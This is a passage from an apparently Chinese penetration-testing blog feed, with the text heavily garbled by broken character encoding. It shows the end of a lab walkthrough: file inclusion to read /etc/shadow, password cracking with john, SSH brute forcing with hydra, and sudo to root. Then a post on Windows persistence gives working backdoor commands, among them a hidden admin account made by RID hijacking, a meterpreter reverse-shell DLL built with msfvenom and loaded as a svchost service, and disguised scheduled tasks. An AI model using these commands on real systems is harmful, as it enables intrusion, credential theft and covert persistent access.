alt="image-20240419235525664"></p><p>æˆ‘ä»¬çœ‹åˆ°äº†å…³é”®çš„åˆ©ç”¨è·¯å¾„å’Œæ–¹å¼ï¼Œæ˜¯ä¸€ä¸ªæœ¬åœ°&#x2F;è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œå¤–åŠ ä¸€ä¸ªç›®å½•ç©¿è¶Šï¼Œé‚£ç°åœ¨æˆ‘ä»¬å°±å»æµ‹è¯•ä¸€ä¸‹</p><p>ä½†æ˜¯ç›´æ¥ä½¿ç”¨cuppaçš„è·¯å¾„æ˜¯æ— æ•ˆçš„</p><p><img src="http://cdn.clown2024.cn/202407151444531.png" alt="image-20240419235900623"></p><p>è”æƒ³åˆ°æˆ‘ä»¬åˆšåˆšçš„å®‰è£…é¡µé¢æ˜¯administrator&#x2F;installationï¼ŒçŒœæµ‹cuppaè¢«æ›¿æ¢æˆadministrator</p><p><img src="http://cdn.clown2024.cn/202407151444532.png" alt="image-20240420000029674"></p><p>å‘ç°èƒ½å¤Ÿè®¿é—®ï¼Œä½†æ˜¯æ²¡æœ‰ä¸œè¥¿è¯»å›æ¥ï¼Œæˆ‘ä»¬burpæŠ“åŒ…çœ‹ä¸€ä¸‹</p><p><img src="http://cdn.clown2024.cn/202407151444533.png" alt="image-20240420000345099"></p><p>å‘ç°è¿˜æ˜¯æ²¡ä»€ä¹ˆä¸œè¥¿ï¼Œæ¢ä¸ªè¯·æ±‚æ–¹å¼çœ‹çœ‹</p><p><img src="http://cdn.clown2024.cn/202407151444534.png" alt="image-20240420000423856"></p><p>å‘ç°èƒ½è¯»äº†ï¼Œæˆ‘ä»¬å»è¯»ä¸€ä¸‹&#x2F;etc&#x2F;shadow</p><p><img src="http://cdn.clown2024.cn/202407151444535.png" alt="image-20240420000532005"></p><p>å‘ç°å¯†ç éƒ½å‡ºæ¥äº†ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨johnå»çˆ†ç ´ä¸€ä¸‹ï¼ŒæŠŠshadowçš„å†…å®¹éƒ½copyä¸‹æ¥ä¿å­˜æˆæ–‡ä»¶</p><p><img src="http://cdn.clown2024.cn/202407151444536.png" alt="image-20240420000813947"></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">john pass.txt<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151444537.png" alt="image-20240420000853870"></p><p>çœ‹åˆ°ä¸¤ä¸ªç”¨æˆ·çš„å¯†ç è¢«çˆ†å‡ºæ¥äº†ï¼Œwww-dataä¸€èˆ¬æ˜¯ä½æƒé™çš„ç”¨æˆ·ï¼Œæˆ‘ä»¬å°±å»è¯•ä¸€ä¸‹w1r3sè¿™ä¸ªç”¨æˆ·ï¼Œå‰é¢æ‰«å‡ºæ¥22çš„sshæœåŠ¡ï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥ç”¨sshå»è¿æ¥çœ‹çœ‹</p><h2 id="sshè¿æ¥"><a href="#sshè¿æ¥" class="headerlink" title="sshè¿æ¥"></a>sshè¿æ¥</h2><p>æ‹¿åˆ°è´¦æˆ·å¯†ç ä¹‹åå»sshè¿æ¥</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">ssh w1r3s@192.168.20.129<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151444538.png" alt="image-20240420001327741"></p><p>æˆåŠŸç™»é™†ï¼</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">id #æ‰“å°çœŸå®ä»¥åŠæœ‰æ•ˆçš„ç”¨æˆ·å’Œæ‰€åœ¨ç»„çš„ä¿¡æ¯<br>sudo -l #æŸ¥çœ‹æœ‰å“ªäº›ç³»ç»Ÿæƒé™ï¼Œåˆ—å‡ºç›®å‰ç”¨æˆ·å¯æ‰§è¡Œä¸æ— æ³•æ‰§è¡Œçš„æŒ‡ä»¤<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151444539.png" alt="image-20240420001652163"></p><p>å‘ç°æ‹¥æœ‰æ‰€æœ‰sudoæƒé™ï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥ç›´æ¥åˆ‡æ¢rootç”¨æˆ·äº†ï¼</p><p><img src="http://cdn.clown2024.cn/202407151444540.png" alt="image-20240420001824485"></p><p>æœ€åæŸ¥çœ‹rootç›®å½•ä¸‹çš„flag.txt</p><p><img src="http://cdn.clown2024.cn/202407151444541.png" alt="image-20240420001906178"></p><p>æˆåŠŸæ‹¿ä¸‹è¿™å°ä¸»æœºï¼</p><p><strong>hydra</strong></p><p>è¿™é‡Œè¿˜å¯ä»¥ç”¨hydraæ¥çˆ†ç ´sshï¼Œæ¥å­¦ä¹ ä¸€ä¸‹</p><blockquote><p>Hydraæ˜¯ä¸€æ¬¾éå¸¸å¼ºå¤§çš„æš´åŠ›ç ´è§£å·¥å…·ï¼Œå®ƒæ˜¯ç”±è‘—åçš„é»‘å®¢ç»„ç»‡THCå¼€å‘çš„ä¸€æ¬¾å¼€æºæš´åŠ›ç ´è§£å·¥å…·ã€‚</p><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://zhuanlan.zhihu.com/p/397779150">https://zhuanlan.zhihu.com/p/397779150</a></p></blockquote><p>è¿™é‡Œè´´ä¸€ä¸‹åŸºæœ¬ä½¿ç”¨è¯­æ³•å’Œå‚æ•°</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">è¯­æ³•ï¼šHydra å‚æ•° IP æœåŠ¡<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">å‚æ•°ï¼š<br>-l login å°å†™ï¼ŒæŒ‡å®šç”¨æˆ·åè¿›è¡Œç ´è§£<br>-L file å¤§å†™ï¼ŒæŒ‡å®šç”¨æˆ·çš„ç”¨æˆ·åå­—å…¸<br>-p pass å°å†™ï¼Œç”¨äºæŒ‡å®šå¯†ç ç ´è§£ï¼Œå¾ˆå°‘ä½¿ç”¨ï¼Œä¸€èˆ¬é‡‡ç”¨å¯†ç å­—å…¸ã€‚<br>-P file å¤§å†™ï¼Œç”¨äºæŒ‡å®šå¯†ç å­—å…¸ã€‚<br>-e ns é¢å¤–çš„é€‰é¡¹ï¼Œnï¼šç©ºå¯†ç è¯•æ¢ï¼Œsï¼šä½¿ç”¨æŒ‡å®šè´¦æˆ·å’Œå¯†ç è¯•æ¢<br>-M file æŒ‡å®šç›®æ ‡ipåˆ—è¡¨æ–‡ä»¶ï¼Œæ‰¹é‡ç ´è§£ã€‚<br>-o file æŒ‡å®šç»“æœè¾“å‡ºæ–‡ä»¶<br>-f æ‰¾åˆ°ç¬¬ä¸€å¯¹ç™»å½•åæˆ–è€…å¯†ç çš„æ—¶å€™ä¸­æ­¢ç ´è§£ã€‚<br>-t tasks åŒæ—¶è¿è¡Œçš„çº¿ç¨‹æ•°ï¼Œé»˜è®¤æ˜¯16<br>-w time è®¾ç½®æœ€å¤§è¶…æ—¶æ—¶é—´ï¼Œå•ä½<br>-v / -V æ˜¾ç¤ºè¯¦ç»†è¿‡ç¨‹<br>-R æ¢å¤çˆ†ç ´ï¼ˆå¦‚æœç ´è§£ä¸­æ–­äº†ï¼Œä¸‹æ¬¡æ‰§è¡Œ hydra -R /path/to/hydra.restore å°±å¯ä»¥ç»§ç»­ä»»åŠ¡ã€‚ï¼‰<br>-x è‡ªå®šä¹‰å¯†ç ã€‚<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">serviceï¼šæŒ‡å®šæœåŠ¡åï¼Œæ”¯æŒçš„æœåŠ¡è·Ÿåè®®æœ‰ï¼štelnetï¼Œftpï¼Œpop3ç­‰ç­‰ã€‚<br>æ³¨æ„ï¼š<br>1.è‡ªå·±åˆ›å»ºå­—å…¸,ç„¶åæ”¾åœ¨å½“å‰çš„ç›®å½•ä¸‹æˆ–è€…æŒ‡å®šç›®å½•ã€‚<br>2.å‚æ•°å¯ä»¥ç»Ÿä¸€æ”¾åœ¨æœ€åï¼Œæ ¼å¼æ¯”å¦‚hydra ip æœåŠ¡ å‚æ•°ã€‚<br>3.å¦‚æœèƒ½ç¡®å®šç”¨æˆ·åä¸€é¡¹æ—¶å€™ï¼Œæ¯”å¦‚webç™»å½•ç ´è§£ï¼Œç›´æ¥ç”¨ -lå°±å¯ä»¥ï¼Œç„¶åå‰©ä½™æ—¶é—´ç ´è§£å¯†ç ã€‚<br>4.ç¼ºç‚¹ï¼Œå¦‚æœç›®æ ‡ç½‘ç«™ç™»å½•æ—¶å€™éœ€è¦éªŒè¯ç å°±æ— æ³•ç ´è§£ã€‚<br>5.man hydraæœ€ä¸‡èƒ½ã€‚<br>6.æˆ–è€…hydra -U http-formç­‰æŸ¥çœ‹å…·ä½“å¸®åŠ©ã€‚<br></code></pre></td></tr></table></figure><p>å¯ä»¥å…ˆæ„é€ ä¸€ä¸ªç”¨æˆ·å­—å…¸ç”¨äºçˆ†ç ´ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">vim user.list<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151444542.png" alt="image-20240420002455502"></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">hydra -L user.list -P /usr/share/wordlists/rockyou.txt -t 4 ssh://192.168.20.129<br></code></pre></td></tr></table></figure><p>éš¾ç»·æ²¡è·‘å‡ºæ¥ï¼Œè¿™æˆ‘ä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆäº†ï¼Œè¿™å­—å…¸æ˜æ˜å¾ˆå¤§</p><p><img src="http://cdn.clown2024.cn/202407151444543.png" alt="image-20240420010700256"></p><p>æœäº†ä¸€ä¸‹å‘ç°ä¹Ÿæ˜¯æœ‰computerå¯†ç çš„</p><p><img src="http://cdn.clown2024.cn/202407151444544.png" alt="image-20240420010802330"></p><p>ç„¶åæˆ‘æŠŠw1r3sæ”¾åˆ°ç¬¬ä¸€ä¸ªï¼Œè·‘äº†å¥½ä¸€ä¼šç»ˆäºæœ‰äº†</p><p><img src="http://cdn.clown2024.cn/202407151444545.png" alt="image-20240420012002198"></p><h2 id="mysqlæœåŠ¡"><a href="#mysqlæœåŠ¡" class="headerlink" title="mysqlæœåŠ¡"></a>mysqlæœåŠ¡</h2><p>è¿™é‡Œå¯èƒ½ä¼šå­˜åœ¨æ²¡æœ‰è®¾ç½®å¯†ç ç›´æ¥ç™»é™†çš„æƒ…å†µï¼Œå¯ä»¥è¯•ä¸€ä¸‹ï¼Œä¸è¿‡åŸºæœ¬éƒ½æ˜¯ä¸å¯èƒ½çš„ï¼Œæ‰€ä»¥ä¸€å¼€å§‹å°±æ²¡æƒ³ç€å…ˆè¯•å®ƒ</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">mysql 192.168.20.129 -u root -p <br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151444546.png" alt="image-20240420002113439"></p>]]></content>
      
      
      <categories>
          
          <category> å†…ç½‘æ¸—é€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¸—é€é¶åœºå­¦ä¹  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å†…ç½‘æƒé™æŒä¹…åŒ–</title>
      <link href="/2024/04/16/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96/"/>
      <url>/2024/04/16/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<p>æƒé™æŒä¹…åŒ–(Persistenceï¼Œæƒé™ç»´æŒ)æŠ€æœ¯å°±æ˜¯åŒ…æ‹¬ä»»ä½•å¯ä»¥è¢«æµ‹è¯•äººå‘˜ç”¨æ¥åœ¨ç³»ç»Ÿé‡å¯ã€æ›´æ”¹ç”¨æˆ·å‡­æ®æˆ–å…¶ä»–å¯èƒ½é€ æˆè®¿é—´ä¸­æ–­çš„æƒ…å†µå‘ç”Ÿæ—¶ä¿æŒå¯¹ç³»ç»Ÿçš„è®¿é—®çš„æŠ€æœ¯ï¼Œå¦‚åˆ›å»ºç³»ç»ŸæœåŠ¡ã€åˆ©ç”¨è®¡åˆ’ä»»åŠ¡ã€æ»¥ç”¨ç³»ç»Ÿå¯åŠ¨é¡¹æˆ–æ³¨å†Œè¡¨ã€æ˜ åƒåŠ«æŒã€æ›¿æ¢æˆ–åŠ«æŒåˆæ³•ä»£ç ç­‰ã€‚</p><h1 id="å¸¸è§ç³»ç»Ÿåé—¨æŠ€æœ¯"><a href="#å¸¸è§ç³»ç»Ÿåé—¨æŠ€æœ¯" class="headerlink" title="å¸¸è§ç³»ç»Ÿåé—¨æŠ€æœ¯"></a>å¸¸è§ç³»ç»Ÿåé—¨æŠ€æœ¯</h1><h2 id="åˆ›å»ºå½±å­è´¦æˆ·"><a href="#åˆ›å»ºå½±å­è´¦æˆ·" class="headerlink" title="åˆ›å»ºå½±å­è´¦æˆ·"></a>åˆ›å»ºå½±å­è´¦æˆ·</h2><p>å°±æ˜¯åˆ›å»ºéšè—çš„ç”¨æˆ·ï¼Œæ— è®ºé€šè¿‡è®¡ç®—æœºç®¡ç†è¿˜æ˜¯å‘½ä»¤è¡ŒæŸ¥è¯¢éƒ½æ— æ³•çœ‹åˆ°ï¼Œåªèƒ½åœ¨æ³¨å†Œè¡¨ä¸­æŸ¥åˆ°å…¶ä¿¡æ¯ã€‚</p><p>ä¸‹é¢æ˜¯åˆ›å»ºå½±å­è´¦æˆ·çš„æ­¥éª¤ï¼š</p><ol><li><p>è¾“å…¥ä¸‹é¢å‘½ä»¤åˆ›å»ºä¸€ä¸ªHacker$ç”¨æˆ·</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">net user Hacker$ Hacker@123 /add # åˆ›å»ºéšè—ç”¨æˆ·ï¼Œ$ç¬¦å·ä»£è¡¨è¯¥ç”¨æˆ·ä¸ºéšè—ç”¨æˆ·<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151710500.png" alt="image-20240416212700791"></p><p>ä¸è¿‡ç°åœ¨è¿˜æ˜¯å¯ä»¥çœ‹åˆ°è¯¥ç”¨æˆ·</p><p><img src="http://cdn.clown2024.cn/202407151710502.png" alt="image-20240416213021125"></p><p>æ­¤æ—¶è¯¥ç”¨æˆ·ä»ä¸ºæ ‡å‡†ç”¨æˆ·ï¼Œæˆ‘ä»¬è¿˜éœ€è¦è¿›è¡Œæ³¨å†Œè¡¨çš„ä¿®æ”¹</p></li><li><p>åœ¨æ³¨å†Œè¡¨ç¼–è¾‘å™¨ä¸­å®šä½åˆ°HKEY_LOCAL_MACHINE\SAM\SAM,å•å‡»å³é”®ï¼Œåœ¨å¼¹å‡ºçš„å¿«æ·èœå•ä¸­é€‰æ‹©â€œæƒé™â€å‘½ä»¤ï¼Œå°† Administratorç”¨æˆ·çš„æƒé™è®¾ç½®ä¸ºâ€œå®Œå…¨æ§åˆ¶â€</p><p><img src="http://cdn.clown2024.cn/202407151710503.png" alt="image-20240416213258642"></p></li><li><p>åœ¨æ³¨å†Œè¡¨é¡¹ HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Nameså¤„é€‰æ‹© Administrator ç”¨æˆ·,åœ¨å·¦ä¾§æ‰¾åˆ°ä¸å³è¾¹æ˜¾ç¤ºçš„é”®å€¼çš„ç±»å‹â€œ0x1f4â€ç›¸åŒçš„ç›®å½•å</p><p><img src="http://cdn.clown2024.cn/202407151710504.png" alt="image-20240416213805850"></p><p>ç„¶åå¤åˆ¶000001F4è¡¨é¡¹çš„Få±æ€§çš„å€¼</p><p><img src="http://cdn.clown2024.cn/202407151710505.png" alt="image-20240416214222391"></p></li><li><p>æ‰¾åˆ°éšè—ç”¨æˆ·çš„ç›¸åº”ç›®å½•ï¼Œç„¶åå°†å¤åˆ¶çš„å±æ€§å€¼ç²˜è´´åˆ°éšè—ç”¨æˆ·çš„Få±æ€§å¤„ã€‚</p><p>ä»¥ä¸Šè¿‡ç¨‹å…¶å®æ˜¯ Hacker$ç”¨æˆ·åŠ«æŒäº†Administratorç”¨æˆ·çš„RIDï¼Œä»è€Œä½¿ Hacker$ç”¨æˆ·è·å¾— Administrator ç”¨æˆ·çš„æƒé™</p><blockquote><p>è¿™é‡Œå¾ˆæ€ªï¼Œåœ¨Winserver2012ä¸Šé¢åˆ›å»ºäº†è´¦æˆ·åœ¨æ³¨å†Œè¡¨æ²¡æœ‰ï¼Œåªæœ‰ä¸¤ä¸ªè´¦æˆ·ï¼Œå°±ä¸Šå›¾çš„ä¸¤ä¸ªï¼Œä½†æ˜¯Windows7å°±å…¨éƒ½æœ‰</p></blockquote></li><li><p>åˆ†åˆ«å°†æ³¨å†Œè¡¨é¡¹â€œHacker$â€å’Œå…¶å¯¹åº”çš„ç›®å½•å¯¼å‡ºï¼Œç„¶åæ‰§è¡Œä¸‹é¢å‘½ä»¤å…ˆåˆ é™¤ä¸€æ¬¡ç”¨æˆ·</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">net user Hacker$ /del<br></code></pre></td></tr></table></figure></li><li><p>å†å°†åˆšåˆšå¯¼å‡ºçš„ä¸¤ä¸ªæ³¨å†Œè¡¨é¡¹å¯¼å…¥æ³¨å†Œè¡¨å³å¯åˆ›å»ºçœŸæ­£çš„å½±å­ç”¨æˆ·ã€‚</p></li></ol><h2 id="ç³»ç»ŸæœåŠ¡åé—¨"><a href="#ç³»ç»ŸæœåŠ¡åé—¨" class="headerlink" title="ç³»ç»ŸæœåŠ¡åé—¨"></a>ç³»ç»ŸæœåŠ¡åé—¨</h2><p>å¯¹äºå¯åŠ¨ç±»å‹ä¸ºâ€œè‡ªåŠ¨â€çš„ç³»ç»ŸæœåŠ¡ï¼Œæµ‹è¯•äººå‘˜å¯ä»¥å°†æœåŠ¡è¿è¡Œçš„äºŒè¿›åˆ¶æ–‡ä»¶è·¯å¾„è®¾ç½®ä¸ºåé—¨ç¨‹åºæˆ–å…¶ä»–æ”»å‡»è½½è·ï¼Œå½“ç³»ç»Ÿæˆ–æœåŠ¡é‡å¯æ—¶ï¼Œå¯ä»¥é‡æ–°è·å–å¯¹ç›®æ ‡ä¸»æœºçš„æ§åˆ¶æƒã€‚ä¸è¿‡ï¼Œæµ‹è¯•äººå‘˜éœ€è¦æ‹¥æœ‰ç›®æ ‡ä¸»æœºçš„ç®¡ç†å‘˜æƒé™ã€‚</p><p><strong>åˆ›å»ºç³»ç»ŸæœåŠ¡</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">sc create Backdoor binpath= &quot;cmd.exe /k C:\Windows\System32\reverse_tcp.exe&quot; start=&quot;auto&quot; obj=&quot;LocalSystem&quot;<br></code></pre></td></tr></table></figure><p>åœ¨ç›®æ ‡ä¸»æœºä¸Šåˆ›å»ºä¸€ä¸ªåä¸ºBackdoor çš„ç³»ç»ŸæœåŠ¡ï¼Œå¯åŠ¨ç±»å‹ä¸ºâ€œè‡ªåŠ¨â€ï¼Œå¯åŠ¨æƒé™ä¸ºSYSTEMã€‚</p><p><strong>åˆ©ç”¨ç°æœ‰çš„ç³»ç»ŸæœåŠ¡</strong></p><p>é€šè¿‡ä¿®æ”¹ç°æœ‰æœåŠ¡çš„é…ç½®ä¿¡æ¯ï¼Œä½¿æœåŠ¡å¯åŠ¨æ—¶è¿è¡ŒæŒ‡å®šçš„åé—¨ç¨‹åºã€‚æµ‹è¯•äººå‘˜å¯ä»¥é€šè¿‡â€œsc configâ€å‘½ä»¤ä¿®æ”¹æœåŠ¡çš„ binpathé€‰é¡¹ï¼Œä¹Ÿå¯ä»¥å°è¯•ä¿®æ”¹æœåŠ¡æ³¨å†Œè¡¨çš„ImagePathé”®ï¼ŒäºŒè€…éƒ½ç›´æ¥æŒ‡å®šäº†ç›¸åº”æœåŠ¡çš„å¯åŠ¨æ—¶è¿è¡Œçš„äºŒè¿›åˆ¶æ–‡ä»¶</p><p><strong>åˆ©ç”¨svchost.exeå¯åŠ¨æœåŠ¡</strong></p><p>svchost.exeæ˜¯ä¸€ä¸ªç³»ç»Ÿè¿›ç¨‹ï¼Œæ˜¯Windowsçš„ç³»ç»Ÿæ–‡ä»¶ã€‚</p><p>å®˜æ–¹è§£é‡Šï¼šsvchost.exeæ˜¯ä»åŠ¨æ€é“¾æ¥åº“(DLL)ä¸­è¿è¡Œçš„æœåŠ¡çš„é€šç”¨ä¸»æœºè¿›ç¨‹åç§°ã€‚è¯¥ç¨‹åºæœ¬èº«åªæ˜¯ä½œä¸ºæœåŠ¡çš„å®¿ä¸»ï¼Œè®¸å¤šç³»ç»ŸæœåŠ¡é€šè¿‡æ³¨å…¥è¯¥ç¨‹åºè¿›ç¨‹ä¸­å¯åŠ¨ï¼Œæ‰€ä»¥ç³»ç»Ÿä¸­ä¼šå­˜åœ¨å¤šä¸ªè¯¥ç¨‹åºçš„è¿›ç¨‹ã€‚</p><p>åœ¨ Windowsç³»ç»Ÿä¸­ï¼Œéœ€è¦ç”±svchost.exeè¿›ç¨‹å¯åŠ¨çš„æœåŠ¡å°†ä»¥ DLL å½¢å¼å®ç°ã€‚åœ¨å®‰è£…è¿™äº›æœåŠ¡æ—¶ï¼Œéœ€è¦å°†æœåŠ¡çš„å¯æ‰§è¡Œæ–‡ä»¶è·¯å¾„æŒ‡å‘svchost.exeã€‚åœ¨å¯åŠ¨è¿™äº›æœåŠ¡æ—¶ï¼Œç”±svchost.exe è°ƒç”¨ç›¸åº”æœåŠ¡çš„ DLL æ–‡ä»¶ï¼Œè€Œå…·ä½“è°ƒç”¨å“ªä¸ª DLL æ˜¯ç”±è¯¥æœåŠ¡åœ¨æ³¨å†Œè¡¨çš„ä¿¡æ¯æ‰€å†³å®šçš„ã€‚</p><p>ä»¥wuauservæœåŠ¡ä¸ºä¾‹(Windows Update)</p><p><img src="http://cdn.clown2024.cn/202407151710506.png" alt="image-20240416223420143"></p><p>å¯ä»¥çœ‹åˆ°è¯¥æœåŠ¡çš„å¯æ‰§è¡Œæ–‡ä»¶è·¯å¾„ï¼š<code>%systemroot%\system32\svchost.exe -k netsvcs</code>ï¼Œè¯´æ˜è¯¥æœåŠ¡ä¾é svchost.exeæ¥åŠ è½½DLLã€‚</p><p>è¯¥æœåŠ¡çš„æ³¨å†Œè¡¨ä¸‹è¿˜æœ‰ä¸€ä¸ªParameterså­é¡¹ï¼Œå…¶ä¸­çš„ServiceDllé”®å€¼è¡¨æ˜è¯¥æ–‡ä»¶ç”±å“ªä¸ªDLLæ–‡ä»¶è´Ÿè´£ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151710507.png" alt="image-20240416224101357"></p><p>æœåŠ¡å¯åŠ¨æ—¶ï¼Œsvchost.exeå°±ä¼šåŠ è½½è¯¥DLLæ–‡ä»¶ã€‚</p><p>æ³¨æ„ï¼Œç³»ç»Ÿä¼šæ ¹æ®æœåŠ¡å¯æ‰§è¡Œæ–‡ä»¶è·¯å¾„ä¸­çš„å‚æ•°å¯¹æœåŠ¡è¿›è¡Œåˆ†ç»„ï¼Œå¦‚C:\Windowssystem32\svchost.exe -k netsvcs è¡¨æ˜è¯¥æœåŠ¡å±äºnetsvcsè¿™ä¸ªæœåŠ¡ç»„ã€‚é€šå¸¸ï¼Œæ¯ä¸ª svchostè¿›ç¨‹è´Ÿè´£è¿è¡Œä¸€ç»„æœåŠ¡ã€‚å› æ­¤ï¼Œå¹¶ä¸æ˜¯æ¯å¯åŠ¨ä¸€ä¸ªæœåŠ¡å°±ä¼šå¢åŠ ä¸€ä¸ªsvchost.exeè¿›ç¨‹ã€‚</p><p>æ‰€æœ‰æœåŠ¡åˆ†ç»„å¯ä»¥åœ¨æ³¨å†Œè¡¨çš„HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchostä¸­ã€‚é€šè¿‡svchost.exeåŠ è½½å¯åŠ¨çš„æœåŠ¡éƒ½è¦åœ¨è¯¥è¡¨é¡¹ä¸­æ³¨å†Œã€‚</p><p><img src="http://cdn.clown2024.cn/202407151710508.png" alt="image-20240416224711806"></p><p>åˆ©ç”¨è¿‡ç¨‹ï¼š</p><ol><li><p>ç”¨Metasploitç”ŸæˆDLL</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.2.143 LPORT=4444 -f dll -o reverse_tcp.dll<br></code></pre></td></tr></table></figure></li><li><p>å°†ç”Ÿæˆçš„DLLä¸Šä¼ åˆ°ç›®æ ‡ä¸»æœºçš„System32ç›®å½•ï¼Œå¹¶æ‰§è¡Œä¸‹é¢å‘½ä»¤å®‰è£…å¹¶é…ç½®æ¶æ„æœåŠ¡</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">åˆ›å»ºåä¸º Backdoorçš„æœåŠ¡ï¼Œå¹¶ä»¥svchoståŠ è½½çš„æ–¹å¼å¯åŠ¨ï¼ŒæœåŠ¡åˆ†ç»„ä¸º netsvc</span><br>sc create Backdoor binPath= &quot;C:\Windows\System32\svchost.exe -k netsvc&quot; start= auto obj= LocalSystem<br><span class="hljs-meta prompt_">#</span><span class="language-bash">å°†BackdooræœåŠ¡å¯åŠ¨æ—¶åŠ è½½çš„DLLä¸ºreverse_tcp.dll</span><br>reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Backdoor\Parameters /v ServiceDll /t REG_EXPAND_SZ /d &quot;C:\Windows\System32\reverse_tcp.dll&quot;<br><span class="hljs-meta prompt_">#</span><span class="language-bash">é…ç½®æœåŠ¡æè¿°</span><br>reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Backdoor /v Description /t REG_SZ /d &quot;Windows xxx Service&quot;<br><span class="hljs-meta prompt_">#</span><span class="language-bash">é…ç½®æœåŠ¡æ˜¾ç¤ºåç§°</span><br>reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Backdoor /v DisplayName /t REG_SZ /d &quot;Backdoor&quot;<br><span class="hljs-meta prompt_">#</span><span class="language-bash">åˆ›å»ºæœåŠ¡æ–°åˆ†ç»„ï¼Œå¹¶å°†BackdooræœåŠ¡æ·»åŠ è¿›å»</span><br>reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost&quot; /v netsvc /t REG_MULTI_SZ /d Backdoor<br></code></pre></td></tr></table></figure></li></ol><p>é…ç½®å¥½åï¼ŒSvchostå°±ä¼šä»¥SYSTEMæƒé™åŠ è½½æ¶æ„DLLï¼Œå³å¯ä¸Šçº¿ä¸»æœºã€‚</p><h2 id="è®¡åˆ’ä»»åŠ¡åé—¨"><a href="#è®¡åˆ’ä»»åŠ¡åé—¨" class="headerlink" title="è®¡åˆ’ä»»åŠ¡åé—¨"></a>è®¡åˆ’ä»»åŠ¡åé—¨</h2><p>é€šè¿‡åˆ›å»ºè®¡åˆ’ä»»åŠ¡ï¼Œè®©æœåŠ¡å™¨å®šæ—¶è¿è¡Œåé—¨ç¨‹åºï¼Œå®ç°æƒé™æŒä¹…åŒ–ã€‚</p><p>æ¯”å¦‚åœ¨ç›®æ ‡ä¸»æœºä¸Šåˆ›å»ºä¸€ä¸ªåä¸ºBackdoorçš„è®¡åˆ’ä»»åŠ¡ï¼Œå¹¶åœ¨æ¯å¤©å…«ç‚¹ä»¥SYSTEMæƒé™è¿è¡Œä¸€æ¬¡åé—¨ç¨‹åºreverse_tcp.exe</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">schtasks /Create /TN Backdoor /SC daily /ST 8:00 /MO 1 /TR C:\Windows\System32\reverse_tcp.exe /RU System /F<br></code></pre></td></tr></table></figure><p>è®¡åˆ’ä»»åŠ¡è§¦å‘åä¸»æœºå°±ä¼šé‡æ–°ä¸Šçº¿</p><p><img src="http://cdn.clown2024.cn/202407151710509.png" alt="image-20240416231100712"></p><p>ä¸Šå›¾å¯ä»¥çœ‹åˆ°è®¡åˆ’ä»»åŠ¡ä»¥ç±»ä¼¼æ–‡ä»¶ç›®å½•çš„æ–¹å¼å­˜å‚¨ï¼Œæ‰€æœ‰è®¡åˆ’ä»»åŠ¡éƒ½å­˜å‚¨åœ¨æœ€å†…å±‚çš„ç›®å½•ï¼›æ‰€ä»¥ä¸ºäº†å¢åŠ éšè”½æ€§ï¼Œå¯ä»¥ä¾ç…§è¿™ä¸ªè§„åˆ™æ¥åˆ›å»ºè®¡åˆ’ä»»åŠ¡ã€‚</p><p>æ¯”å¦‚è¿™æ ·ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">schtasks /Create /TN \Microsoft\Windows\AppTask\AppRun /SC daily /ST 8:00 /MO 1 /TR C:\Windows\System32\reverse_tcp.exe /RU System /F<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151710510.png" alt="image-20240416232004716"></p><h2 id="å¯åŠ¨é¡¹x2fæ³¨å†Œè¡¨åé—¨"><a href="#å¯åŠ¨é¡¹-æ³¨å†Œè¡¨åé—¨" class="headerlink" title="å¯åŠ¨é¡¹&#x2F;æ³¨å†Œè¡¨åé—¨"></a>å¯åŠ¨é¡¹&#x2F;æ³¨å†Œè¡¨åé—¨</h2><p>æµ‹è¯•äººå‘˜å¯ä»¥é€šè¿‡å°†åé—¨ç¨‹åºæ·»åŠ 